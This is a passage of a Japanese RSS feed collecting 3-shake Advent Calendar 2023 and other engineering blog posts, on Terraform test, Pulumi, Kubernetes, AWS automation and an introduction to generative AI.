Storageにて、Archive時に大量課金事故が発生したそうです。これはArchiveで費用が嵩むのは仕方がないものの、想定できておらず、予算がつけれてなかったとのことでした。それから、BigQueryをTerraformでLogical StorageからPhysical Storageに変更しようとしたら、変更されておらず、Active Logical Strageでコスト増！原因はドキュメントに乗っていたクエリが間違っており、さらに、知らないうちに正しいものに更新されていた。という大変な思いも。ドキュメントも鵜呑みにはできないですね。課金事故勉強になりました！アンケート参加してくださった方ありがとうございました。アンケートのご記入にもご協力くださいm(._.)mdocs.google.comアーカイブ動画編集後、アーカイブ動画がアップロードされる予定です。YouTubeの3-SHAKEチャンネルをご登録の上、お待ちください。アドベントカレンダー次回へのバトンタッチKubernetes Advent Calendar 202312月20日はHiroshi Hayakawaさんの記事です。お楽しみに！]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[terraform test: 応用機能]]></title>
            <link>https://zenn.dev/kyohei_saito/articles/52ce184522aae9</link>
            <guid>https://zenn.dev/kyohei_saito/articles/52ce184522aae9</guid>
            <pubDate>Sun, 17 Dec 2023 14:58:00 GMT</pubDate>
            <content:encoded><![CDATA[この記事は 3-shake Advent Calendar 2023 18 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能 <- 今ここterraform test: 細かい挙動 はじめに前回の記事では、 terraform test の基本的な機能の紹介をしました。前回の記事の内容でも十分に terraform module のテストを書くことができると思います。しかし、今回紹介する応用的な機能を使...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[AWS Step Functionsを利用してAWSリソースの自動起動停止を行う]]></title>
            <link>https://qiita.com/ys1/items/21744f39676286b2c321</link>
            <guid>https://qiita.com/ys1/items/21744f39676286b2c321</guid>
            <pubDate>Sun, 17 Dec 2023 14:55:57 GMT</pubDate>
            <content:encoded><![CDATA[概要本記事ではStep Functionsを利用して、AWSリソースを自動で起動停止する方法について記載します。主にコスト削減のために、開発環境を夜間停止するなどで利用することを想定しています。今回は以下のようなことを実施する方法について説明しま…]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Inplace pod vertical Scalingについて調べる]]></title>
            <link>https://qiita.com/ys1/items/2bd32750977960b7ef33</link>
            <guid>https://qiita.com/ys1/items/2bd32750977960b7ef33</guid>
            <pubDate>Sun, 17 Dec 2023 14:53:50 GMT</pubDate>
            <content:encoded><![CDATA[概要この記事ではKubernetes 1.27で新たに導入されたIn-place pod vertical Scalingに関して調べたことを共有しますIn-place pod vertical…]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[生成AIについて学んだのでざっとアウトプット]]></title>
            <link>https://shu-kob.hateblo.jp/entry/2023/12/17/005138</link>
            <guid>https://shu-kob.hateblo.jp/entry/2023/12/17/005138</guid>
            <pubDate>Sat, 16 Dec 2023 15:51:38 GMT</pubDate>
            <content:encoded><![CDATA[はじめに3-shake Advent Calendar 2023シリーズ1、17日目の記事です。私は12月1日に株式会社スリーシェイクに入社した、小渕と申します。前職は暗号資産交換所で、AWS上でブロックチェーンフルノードやウォレット基盤の構築・運用を行なってきました。スリーシェイクではSreake事業部のSREとして、インフラをやりつつも、生成AI等のアプリケーション構築も行なっていく予定です。よろしくお願いいたします。生成AIをこれからやっていくにあたり、インプットした情報のアウトプットをしていきます。ポエムになりますが、ご了承くださいm(._.)m生成AIを触ってみるディープラーニング（深層学習）などを用いた従来のAIは基本的にデータの「分析」に使われてきましたが、生成AI（Generative AI）は文字通り「画像」や「テキスト」、「ソースコード」を生成します。2022年春頃からは、ユーザが入力したテキストを元に絵画を描く画像生成AIのサービスが数多く誕生し、2022年11月にベータ版がリリースされたChatGPTのリリースは世界的に注目を集め、今年2023年は生成AIがIT業界で注目の的となった一年でした。ChatGPTを使ったことがない方は無料版を使えますので、ぜひ使ってみましょう。私は以下の使い方をしてみました。私「私はIT企業でクライアントワークをするエンジニアです。顧客に提案するため、生成AIを使う事業企画書を出してください。」もちろんです。生成AIを活用した事業企画書は、顧客への提案を効果的に行うための素晴らしい手段です。以下は、そのような企画書の構成例です。まず、以下の項目を含めることが重要です。導入の背景と目的なぜ生成AIを導入する必要があるのか、それによって解決できる課題や得られるメリットを明確に説明します。生成AIの概要生成AIの基本的な機能や技術について説明し、どのように機能するのかを分かりやすく示します。ビジネスへの価値生成AIがビジネスに与える具体的な価値や影響について示します。例えば、時間の節約、コスト削減、品質向上、顧客満足度の向上などです。導入計画生成AIの導入に関する計画を示します。導入の段階、時間枠、費用、人員配置などを詳細に記載します。リスクと対策導入に伴うリスクや懸念点を列挙し、それに対する対策やリスク軽減策を提示します。成功事例や導入効果他社での成功事例や導入後の具体的な効果、改善された業績などを具体的な数字や事実を交えて提示します。サポートとトレーニング導入後のサポート体制や従業員へのトレーニングプログラムについて説明します。利用者が十分なサポートを受けられるように計画を立てます。導入後の運用と評価生成AIの導入後、どのように運用し、どのような指標で評価するのかを示します。これらの要素を含んだ事業企画書は、顧客に対して生成AIの導入がなぜ重要であるのかを説得力を持って伝えることができます。また、具体的な事例や効果を提示することで、顧客の興味を引きつけ、導入に対する理解を深めることができるでしょう。これだけ見ても、既存のチャットボットよりちゃんとした返しをしているのがお分かりいただけるでしょうか？コンピュータへの指示を「プロンプト」と言いますが、このプロンプトを具体的にすればするほど、AIの返答も精密になっていきます。プロンプトを適切に設計することを「プロンプトエンジニアリング」と言います。生成AIの得意不得意テキストを生成するのは得意ですが、算数・数学の文章題は意外にも苦手です。生成AIが言葉を理解（自然言語処理）するのに、単語の意味や相関性をベクトルを用いて、膨大な蓄積データから確率的に処理しているのですが、文章題もテキスト処理してしまうと文章を確率的に処理して、残念な結果になることも。膨大なデータの蓄積はしているものの、その中にないことには答えられません。例えば、ChatGPTで会社のことを聞くと知らないとのことでした。私「株式会社スリーシェイクについて教えてください。」申し訳ありませんが、2022年の情報までしか私のデータベースにはアクセスできません。そのため、特定の企業に関する最新の情報を提供することはできません。株式会社スリーシェイクについての情報は、公式ウェブサイトやニュース記事、ビジネスディレクトリ、または企業情報を提供するデータベースなどを確認することで最新の情報を入手できるかもしれません。お探しの情報が特定の業界やサービスに関連している場合は、その背景や提供しているサービスについて私がお手伝いできるかもしれません。どのような情報をお探しですか？生成AIをどうビジネスに活用するかまずはChatGPTに聞いてみました。私「生成AIを用いたビジネスアイデアを教えてください」生成AIを活用したビジネスアイデアはさまざまですが、いくつか例を挙げてみましょう。カスタマイズされたコンテンツの提供生成AIを使用して、個々のユーザーに合わせたカスタマイズされたコンテンツを提供するプラットフォームを開発する。例えば、ニュース記事、ブログ投稿、商品レコメンデーションなど。クリエイティブなコンテンツ生成ツール生成AIを活用したクリエイティブツールの開発。例えば、自動生成されたイメージ、デザイン、音楽、または詩の生成ツール。仮想アシスタントやカスタマーサポート会話型AIを活用した仮想アシスタントやカスタマーサポートの提供。顧客とのインタラクションを自動化し、サポート体制を向上させる。製品開発やデザインの支援生成AIを使って、新しい製品のアイデアやデザインの提案を行うツールやプラットフォームを提供。アイデアのブレストや設計プロセスを支援する。自動化されたレポートや分析生成AIを利用して、データ分析やレポート作成を自動化するツール。ビジネスのデータを解釈し、洞察を提供する。これらのアイデアは、生成AIの力を活用して新しいビジネスモデルやサービスを展開する可能性を示しています。AI技術を利用することで、効率性の向上や顧客体験の向上など様々なメリットを生み出すことができます。このように出てきました。ChatGPTだけを使うのであれば、個人が補助的に使用し、生産性を高めていくことはできますが、社内で生成AIを用いたアプリケーションを導入するとなると、業務分析をし、業界や各社の業務に合わせたプロダクトが必要になってくるかと思いました。参考資料生成AIのまとまった知識を頭に入れておこうと思い、ビジネス書を一読しました。小林雅一 著「生成ＡＩ――「ChatGPT」を支える技術はどのようにビジネスを変え、人間の創造性を揺るがすのか？」ダイヤモンド社生成AIに関するビジネス書は数多く出ていて、他のは読んでませんが、読むとしたらご自分にあったのを読むといいと思います。生成AIについて知った後、じゃあビジネスに導入するのはどうすればいいのか？と悩むことになると思いますが、このブログ書いている最中にググったら、以下の書籍が良さげです。（早速Kindle版をポチりました）小澤健祐(おざけん)著「生成AI導入の教科書」ワン・パブリッシング3-shake Advent Calendar 2023シリーズ1、3日目には橋本さんがAI何も知らないSREがGenerative AIで何ができるか考えた in 2023を書いています。こちらもぜひお読みください。スリーシェイクの生成AIの取り組みスリーシェイクでは、Google Cloud向けの生成AIスターターパックというパッケージングサービスを提供しています。sreake.comまた、生成AIを用いたアプリケーション開発、インフラ基盤構築も行います。以下からお問い合わせください。sreake.comアドベントカレンダー翌日の予告12月18日の3-shake Advent Calendar 2023は以下の通りです！シリーズ1は、林愛子さん「5,000円以下で選ぶ！今年のトレンド「ノームコア」をおさえたメンズコーデ3選。」シリーズ2は、@kiyos_1207 さん「terraform test: 応用機能」明日もお楽しみに！]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[terraform test: 基本機能]]></title>
            <link>https://zenn.dev/kyohei_saito/articles/a32b5a11c81e97</link>
            <guid>https://zenn.dev/kyohei_saito/articles/a32b5a11c81e97</guid>
            <pubDate>Sat, 16 Dec 2023 14:58:00 GMT</pubDate>
            <content:encoded><![CDATA[この記事は 3-shake Advent Calendar 2023 17 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能 <- 今ここterraform test: 応用機能terraform test: 細かい挙動 terraform test とはなにか 概要terraform test は Terraform module を実際に plan / apply して動作を確認するツールです。ドキュメントにも明記されている通り、主な使...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Terraform使いがPulumiに入門しました]]></title>
            <link>https://blog.masasuzu.net/entry/2023/12/16/000000</link>
            <guid>https://blog.masasuzu.net/entry/2023/12/16/000000</guid>
            <pubDate>Fri, 15 Dec 2023 15:00:00 GMT</pubDate>
            <content:encoded><![CDATA[この記事は3-shake Advent Calendar 2023の16日目の記事です。qiita.comこの内容はSRETT #8で発表した内容に補足しています。3-shake.connpass.com    前提語らないことモチベーションPulumiとは対応言語PulumiのアーキテクチャPulumiのコンポーネントPulumi CloudPulumi Cloud 料金Pulumi操作方法PulumiインストールPulumi CloudへログインProjectの作成変更を確認Stackデプロイリソース削除state操作Terraformからの移行TerraformとPulumiを共存する(tfstateを参照)tfstateからインポートterraformからコード変換まとめ前提筆者は以下の背景を持っています。普段はAWSをメインに触っている普段はTerraformをメインで使ってるPulumiはプロダクションでは使ったことがないちゃんとは把握できてない語らないこと以下のようなPulumi以外の基本的なことは語りませんIaCとは概要、特徴、メリット・デメリットTerraformとは概要、特徴、メリット・デメリット、操作方法モチベーションなんでPulumiを今回調べようかと思った動機について書こうと思います。Terraformの記述力に限界を感じていたというところが大きいです。以下の点がつらいかなと思っていたところです。足りない関数二重ループのためのModule使用分岐処理のためのcountと三項演算子とはいえ、記述力が低いからこそ複雑なことを抑制できて可読性が上がっている面もあると思います。冗長でも、可読性が高いというのはメリットではあります。他の選択肢としては以下のものがあるかと思います。CDKAWSに限定されるCDKTF(CDK for Terraform)結局terraformのJSONコードに変換されるので、terraformに依存しますそれ自体は悪くないが、どうせならTerraformから離れたものを学びたいそこでなにか良いものがないかと思い当たったところにPulumiがあったので調べてみようとなりました。PulumiとはPulumiはプログラミング言語でインフラを構築可能なプロビジョニングツールです。Terraformと同じようにProviderを通して複数のクラウドに対応しています。TerraformはHCLという宣言的言語を使用するのに対し、Pulumiは汎用的なプログラミング言語を使用してインフラリソースを定義します。Pulumi - Infrastructure as Code in Any Programming Language対応言語TypeScript & JavaScript (Node.js)PythonGoC#, VB, F# (.NET)JavaPulumi YAML参考: Pulumi Languages & SDKs | Pulumi DocsPulumiのアーキテクチャ以下のようの構成になっています。参考: How Pulumi Works | Pulumi DocsLanguage hostインフラリソースの定義を Program (後述)として好きな言語で定義します。Deployment Engine希望する状態に変更するための操作セットを実行する役割を果たします。Resource Providerクラウドサービスとの通信を処理して、Programで定義したリソースの変更処理を行います。上記の例だと、Programにリソースの定義がある場合、Stateと比較して、管理されているリソースであるかを確認します。存在すれば、プロバイダーを通して実際のクラウドのリソースの状態と比較して差分があれば適用。存在しない場合、プロバイダーを通してリソースを作成。PulumiのコンポーネントWhat is Pulumi? | Pulumi DocsPulumiのコンポーネントは以下のようになっています。ProjectProgramのソースコードとメタデータ(Programの実行方法)を格納したディレクトリProgramインフラのあるべき姿を定義したものResourceインフラを構成するオブジェクト。ResourceのプロバティはOutputとして他のResourceのInputに使用することができますStackProgramを実行すると作成されるインスタンス。同一のProgramから開発、ステージング、本番環境のStackを個別に作成することができます。Pulumi CloudTerraform Cloudのようなものと考えていただいて良いです。デプロイの状態、履歴やシークレットを管理して、CI/CDやGitHubと連携してデプロイを実行することもできます。Pulumi CLIはバックエンドを明示的に指定しない限りはでデフォルトでPulumi Cloudを使用します。Terraformはデフォルトでlocalバックエンドを使用します。以下はPulumi Cloudの画面です。Pulumi Cloud 料金個人で使う限りは無料で使用することができます。※2023/12/18現在Pulumi操作方法ここからPulumiの操作方法を見て行きたいと思いますPulumiインストール個人的にはバージョン管理したいのでasdfでインストールします。brewでもインストールできます。# .tool-versionspulumi 3.97.0 asdf installPulumi CloudへログインデフォルトではPulumi Cloudへログインします。以下のコマンドを実行するとブラウザが起動するので、ログイン処理をします。pulumi loginPulumi Cloudを使わず、ローカルにstateを保存したい場合は以下のとおりです。pulumi logoutpulumi loign --localProjectの作成pulumi new コマンドで新しいProjectを作成できます。同時にStackも作成されます。引数にテンプレートを指定できます。ウィザード形式で設定をすることができます。以下の例は awsプロバイダーを使用して、言語はTypeScriptを使用するテンプレートとなります。ディレクトリ内にはPulumi実行に必要な各種ファイルが生成されます。ここで見るべきは以下の3ファイルです。Pulumi.yamlプロジェクト設定Pulumi.dev.yamlStack(dev)設定index.tsリソース定義# Pulumi.yamlname: sampleruntime: nodejsdescription: A minimal AWS TypeScript Pulumi program# Pulumi.dev.yamlconfig:aws:region: us-east-1// index.tsimport * as pulumi from "@pulumi/pulumi";import * as aws from "@pulumi/aws";import * as awsx from "@pulumi/awsx";// Create an AWS resource (S3 Bucket)const bucket = new aws.s3.Bucket("my-bucket");// Export the name of the bucketexport const bucketName = bucket.id;変更を確認plumi preview コマンドでStackの変更差分を確認できます。 terraform plan を似ていますが、こちらは差分の詳細は表示されません。Stackデプロイpulumi up コマンドでStackをデプロイできます。 terraform plan と terraform apply を組み合わせた挙動になります。実行すると選択肢が出ます。details を選択すると変更差分の詳細が表示されます。yesを選択すると、変更が適用されます。リソース削除pulumi destroy でStackを削除できます。pulumi up と同じようにdetailsで詳細表示、 yes で削除実行ができますstate操作PulumiではStackごとにStateが保存されています。Stateを操作するコマンドは以下のとおりです。state出力(terraform state pull 相当 )pulumi stack exportstate インポート(terraform import相当)pululmi import <TYPE> <NAME> <ID>state 削除(terraform state rm 相当)pulumi state delete <URN>Terraformからの移行Terraformからの移行オプションは以下の通りとなります。terraformとPulumiを共存するPulumiからtfstateを参照するtfstateからリソースをPulumiへインポートするTerraformのコードをPulumiのコードに変換する参考: Adopting Pulumi | Pulumi Docs参考: Migrating from Terraform | Pulumi DocsTerraformとPulumiを共存する(tfstateを参照)networkリソースに関しては既存のterraformを使いつつ、そのoutputをPulumiで使うイメージになります。以下のようなコードでlocalのtfstateが参照できるので、値を参照して利用することができます。import * as aws from "@pulumi/aws";import * as terraform from "@pulumi/terraform";// Reference the Terraform state file:const networkState = new terraform.state.RemoteStateReference("network", {    backendType: "local",    path: "/path/to/terraform.tfstate",});// Read the VPC and subnet IDs into variables:const vpcId = networkState.getOutput("vpc_id");const publicSubnetIds = networkState.getOutput("public_subnet_ids");// Now spin up servers in the first two subnets:for (let i = 0; i < 2; i++) {    new aws.ec2.Instance(`instance-${i}`, {        ami: "ami-7172b611",        instanceType: "t2.medium",        subnetId: publicSubnetIds[i],    });}tfstateからインポートpulumi import --from terraform ./terraform.tfstate のようにすることによってtfstateからリソースをインポートすることができます。terraformからコード変換pulumi convert --from terraform コマンドを使用することで、既存のTerraformのコードをPulumiのコードに変換することができます。ただし、変換できないコードはTODOコメントが付く。90%~95%は変換が対応しているとのこと。pulumi convert --from terraform --language typescriptまとめPulumiの概要と基本操作をTerraformと対比しながら説明してきました。新規プロジェクトである程度複雑な処理をしたい。プログラミング言語に精通している人がメンバーにいる。そういった場合にはPulumiは良さそうに思えます。しかしながら、ある程度Terraformで出来上がっているプロジェクトをPulumiに移行するのはそれなりに大変なので、プロジェクトの規模感とコストに見合うかを考えて導入するか考えると良いでしょう。また、複雑なことをしたいというのは、本当に必要とされていることなのでしょうか?冗長でも簡易的な書き方をした方が望ましい場合もあるかと思います。そのあたりの目利きをちゃんと考えたいところです。自分自身まだまだ使いこなせていないですし、追いきれてないPulumiのトピックもあるので、今後も選択肢の一つとして調べていきたいところです。]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[sbt-github-acitons を使った CI の構築とプロジェクトの publish について]]></title>
            <link>https://zenn.dev/nomadblacky/articles/4c6a03aa5289c4</link>
            <guid>https://zenn.dev/nomadblacky/articles/4c6a03aa5289c4</guid>
            <pubDate>Fri, 15 Dec 2023 03:00:00 GMT</pubDate>
            <content:encoded><![CDATA[この記事は Scala Advent Calendar 2023 15日目 の記事です。 導入Scala プロジェクトを GitHub で開発する際には GitHub Actions を使用して CI を構築することが多いと思います。また、ライブラリの開発の場合は Maven Central に publish することも考えたいです。しかし、プロジェクトそれぞれに対応した GitHub Actions を構築するのは専門知識も必要で手間のかかる作業です。今回は sbt-github-actions という sbt プラグインを使用して、Scala プロジェクトの CI と ...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[VPC エンドポイントポリシーで S3 バケットを制限する際の落とし穴]]></title>
            <link>https://zenn.dev/toshikish/articles/e846fa0c3de10f</link>
            <guid>https://zenn.dev/toshikish/articles/e846fa0c3de10f</guid>
            <pubDate>Thu, 14 Dec 2023 22:00:00 GMT</pubDate>
            <content:encoded><![CDATA[状況設定AWS の VPC エンドポイントポリシーで VPC 内部から　Amazon S3 バケットへのアクセスを制限するために，以下のようなエンドポイントポリシーを設定するとします。s3-vpc-endpoint-policy.json{    "Version": "2012-10-17",    "Statement": [        {            "Effect": "Allow",            "Principal": "*",            "Action": "s3:*",            "Resource...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[拝啓、CSSでドット絵を描きたくなったあの日(数週間前)の自分へ]]></title>
            <link>https://zenn.dev/nedoko_dok0dko/articles/c00b941f10501f</link>
            <guid>https://zenn.dev/nedoko_dok0dko/articles/c00b941f10501f</guid>
            <pubDate>Thu, 14 Dec 2023 15:31:58 GMT</pubDate>
            <content:encoded><![CDATA[※ 3-shake Advent Calendar 2023の15日目のエントリー記事です。※ 12/21追記: CSS Advent Calendar 2023の21日目のエントリー記事として追加しました。投稿期間とズレてしまっていますが、CSSアドベントカレンダー盛り上がりの一助になればと思います。今年は数年離れていたデータエンジニアを再スタートし、データ基盤構築やGoogleCloudのProfessional試験を受けて合格したり…とテッキーな事に触れることが多い年でした。最近はDBやSRE領域に触れる機会もあり、自分の知識不足に凹みながらも「今は学ぶ時期だ」と1つずつ知識...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Karpenter を Amazon EKS で使う]]></title>
            <link>https://sreake.com/blog/karpenter-with-amazon-eks/</link>
            <guid>https://sreake.com/blog/karpenter-with-amazon-eks/</guid>
            <pubDate>Thu, 14 Dec 2023 05:17:05 GMT</pubDate>
            <content:encoded><![CDATA[はじめに Kubernetes のノードのオートスケーラーである Karpenter は，Amazon EKS クラスタでの利用を中心に普及しつつあります。 Karpenter を調べてみた・使ってみた系記事はたくさんあ […]The post Karpenter を Amazon EKS で使う first appeared on sreake.com | 株式会社スリーシェイク.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Google Cloud Partner Top Engineer 2024 になりました]]></title>
            <link>https://sreake.com/blog/earn-google-cloud-partner-top-engineer-2024/</link>
            <guid>https://sreake.com/blog/earn-google-cloud-partner-top-engineer-2024/</guid>
            <pubDate>Thu, 14 Dec 2023 05:15:38 GMT</pubDate>
            <content:encoded><![CDATA[はじめに 今回、ありがたいことに、 Google Cloud Partner Top Engineer 2024(以降PTE)になりましたのでその軌跡をまとめます。 コチラの資料によって PTE になりたい人が増えてくれ […]The post Google Cloud Partner Top Engineer 2024 になりました first appeared on sreake.com | 株式会社スリーシェイク.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[AWS Fault Injection Service で EKS の障害テストを行う]]></title>
            <link>https://zenn.dev/kyohei_saito/articles/6d1bcc1fe8610e</link>
            <guid>https://zenn.dev/kyohei_saito/articles/6d1bcc1fe8610e</guid>
            <pubDate>Wed, 13 Dec 2023 22:22:00 GMT</pubDate>
            <content:encoded><![CDATA[この記事は 3-shake Advent Calendar 2023 14 日目の記事です！ この記事に書いてあることこの記事では、AWS Fault Injection Service をつかって、EKS 上の Pod の障害テストを行う方法を説明します。この記事を書こうと思ったモチベーションとして、EKS 上のアプリケーションで障害テストをするために AWS Fault Injection Service (以降、「FIS」と記載します) を使用しようとしたところ、導入手順がいまいち分からなかったため、残しておこうと思ったためです。EC2 に障害を注入する場合は導入手順はシ...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[[Kubernetes 1.27] Pod 停止時のフェーズ遷移の変更]]></title>
            <link>https://zenn.dev/toversus/articles/88ce2ea66b532d</link>
            <guid>https://zenn.dev/toversus/articles/88ce2ea66b532d</guid>
            <pubDate>Wed, 13 Dec 2023 00:43:43 GMT</pubDate>
            <content:encoded><![CDATA[Kubernetes 1.27 で KEP-3329: Retriable and non-retriable Pod failures for Jobs の一部として実装された [k/k#115331]: Give terminal phase correctly to all pods that will not be restarted により、Pod 停止時のフェーズが Running から Succeeded か Failed に遷移するようになりました。しかし、この変更が以下の予期せぬ問題を引き起こすことになります。[k/k#117018]: daemonset stuc...]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[GitHub Actions で multi-platform container image を build して ECR に push する]]></title>
            <link>https://qiita.com/yteraoka/items/e1f89d28da4ba5078660</link>
            <guid>https://qiita.com/yteraoka/items/e1f89d28da4ba5078660</guid>
            <pubDate>Tue, 12 Dec 2023 22:01:45 GMT</pubDate>
            <content:encoded><![CDATA[AWS の EKS や ECS では x86_64 も Graviton の arm64 も選択可能です、どちらでも使うかもしれない Container image は multi-platform…]]></content:encoded>
        </item>
    </channel>
</rss>